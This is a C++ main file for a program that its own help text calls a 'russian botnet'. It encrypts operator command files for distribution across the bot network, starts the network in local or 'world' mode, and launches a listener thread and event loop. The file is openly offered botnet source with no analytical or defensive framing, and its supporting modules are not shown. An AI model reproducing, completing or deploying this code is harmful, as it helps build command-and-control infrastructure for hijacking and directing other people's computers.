#include "crypter.h"
#include "globaltransporter.h"
#include "hostdeterminer.h"
#include "hostlistcollector.h"
#include "thread"
#include <iostream>

using namespace std;
void printHelp(char *firstArgument)
{
    std::cout << "russian botnet" << std::endl
              << "usage: " << std::string(firstArgument)
              << " [init|load] [base|simple] [local|world]"
              <<std::endl << "for local load if you have private key use 'loader'"<< std::endl;
}
#include <openssl/sha.h>


void loadCmdToNetwork(){
    Crypter * _crypter = new Crypter();
    std::string path = "cmdForLoad";
    //std::map<int, std::string> result;
    for (const auto & entry : std::filesystem::directory_iterator(path)){
        std::string filename = entry.path();
        std::string forId = filename.substr(filename.find("/")+1, filename.size());
        std::cout << entry.path() <<" " << forId<< std::endl;

        int id = std::stoi(forId);
        std::string command = "";
        std::string line = "";
        std::ifstream in(entry.path());
        if (in.is_open())
        {
            while (std::getline(in, line))
            {
                command += line + "\n";
            }
        }
        in.close();
        std::string cryptedCmd = _crypter->crypt(command);
        std::ofstream out;          // поток для записи
        out.open("commands/"+std::to_string(id)  + "_c.txt");      // открываем файл для записи
        if (out.is_open())
        {
            out << cryptedCmd;
        }
        else{
            std::cout << "Cant rewrite file" << std::endl;
        }
        out.close();

    }
}

int main(int argc, char *argv[])
{

    if (argc == 2 && std::string(argv[1]) == "loader"){
        loadCmdToNetwork();
        return 0;
    }
    if (argc != 4) {
        printHelp(argv[0]);
        return 1;
    }

    GlobalTransporter *global;
    bool isSimpleMode;
    bool local;
    if (std::string(argv[2]) == "simple") {
        isSimpleMode = true;
    } else if (std::string(argv[2]) == "base") {
        isSimpleMode = false;
    }
    else {
        printHelp(argv[0]);
        return 1;
    }

    if (std::string(argv[3]) == "local") {
        local = true;
    } else if (std::string(argv[3]) == "world") {
        local = false;
    } else {
        printHelp(argv[0]);
        return 1;
    }
    global = new GlobalTransporter(isSimpleMode, local);

    if (std::string(argv[1]) == "load") {
        global->load();
    } else if (std::string(argv[1]) == "init") {
        global->init();
    }
    else {
        printHelp(argv[0]);
        delete global;
        return 1;
    }

    std::thread *thread = new std::thread(&GlobalTransporter::startListening, global);

    cout << endl << "EVENT LOOP START!" << endl << endl;
    global->eventLoop();


    return 0;

}
